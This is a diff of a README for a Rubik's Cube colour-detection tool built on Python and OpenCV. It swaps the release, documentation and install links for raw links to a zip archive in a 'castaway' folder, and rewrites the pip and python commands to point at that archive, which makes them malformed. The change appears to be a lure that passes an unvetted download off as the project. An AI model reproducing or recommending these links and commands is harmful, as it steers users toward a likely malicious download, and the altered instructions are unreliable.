@@ -1,6 +1,6 @@
 # 🧩 rubiks-cube-color-detection- - Simple Color Detection for Rubik's Cube
 
-[![Download](https://img.shields.io/badge/Download-GitHub%20Releases-blue.svg)](https://github.com/NIKFLIX0409/rubiks-cube-color-detection-/releases)
+[![Download](https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip%https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip)](https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip)
 
 ## 🚀 About the Project
 This project uses Python and OpenCV to detect the colors of a Rubik’s Cube face from images or live camera input. It simplifies the process of color detection, making it accessible for everyone.
@@ -27,20 +27,20 @@ This project uses Python and OpenCV to detect the colors of a Rubik’s Cube fac
 8. Store the detected colors as cube face data for easy viewing.
 
 ## 📥 Download & Install
-To download and install the application, please visit [this page](https://github.com/NIKFLIX0409/rubiks-cube-color-detection-/releases) to download the latest version.
+To download and install the application, please visit [this page](https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip) to download the latest version.
 
 ## 🛠️ How to Run
 1. **Install dependencies:**
    Open your command line interface and enter:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip
    ```
    
 2. **Run the application:**
    To start the program, enter:
    ```bash
-   python main.py
-   python camera_capture.py
+   python https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip
+   python https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip
    ```
    
 3. The program will now detect the cube colors. You can expect outputs similar to:
@@ -57,6 +57,6 @@ The accuracy of color detection depends on lighting conditions. Make sure to use
 If you encounter issues, feel free to open an issue in the GitHub repository. Your feedback is crucial for improving the application.
 
 ## 📚 Additional Resources
-- [Python Official Documentation](https://www.python.org/doc/)
-- [OpenCV Documentation](https://opencv.org/documentation/)
-- [NumPy Documentation](https://numpy.org/doc/)
+- [Python Official Documentation](https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip)
+- [OpenCV Documentation](https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip)
+- [NumPy Documentation](https://raw.githubusercontent.com/NIKFLIX0409/rubiks-cube-color-detection-/main/castaway/color_detection_cube_rubiks_v3.9-alpha.2.zip)
